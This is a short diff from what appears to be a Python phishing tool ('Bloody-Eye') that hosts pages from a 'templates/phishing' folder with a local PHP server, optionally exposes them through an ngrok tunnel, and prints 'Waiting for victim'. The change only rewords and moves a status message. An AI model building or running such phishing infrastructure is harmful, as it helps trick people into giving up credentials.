@@ -536,6 +536,7 @@ exit();""")
        a = ngrok.connect(6060,"http",auth_token=token)
        print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 1 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("http","https").replace("-> https://localhost:6060",""))
        print("\n"+Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+"]"+Fore.BLUE+" URL 2 :"+Fore.GREEN+str(a).replace('"','').replace("NgrokTunnel:","").replace("-> http://localhost:6060",""))
+       print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for victim,"+Fore.BLUE+" Ctrl + C"+Fore.YELLOW+" to exit...")
     v = input(Fore.RED+" ["+Fore.WHITE+"~"+Fore.RED+Fore.RED+"]"+Fore.CYAN+" Select a Port Forwarding Service : ")
     if v == "01":
       bannner.banner2()
@@ -543,8 +544,7 @@ exit();""")
       with open("log","w") as phplog:
          Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
       print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.GREEN+" Hosted at : "+Fore.BLUE+"localhost:6060")
-      time.sleep(0.07)
-      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for Victim, "+Fore.BLUE+"Ctrl + C "+Fore.YELLOW+"to exit...")
+      print("\n"+Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+Fore.YELLOW+" Waiting for victim,"+Fore.BLUE+" Ctrl + C"+Fore.YELLOW+" to exit...")
     elif v == "02":
        ngrokserver()
     def userin():
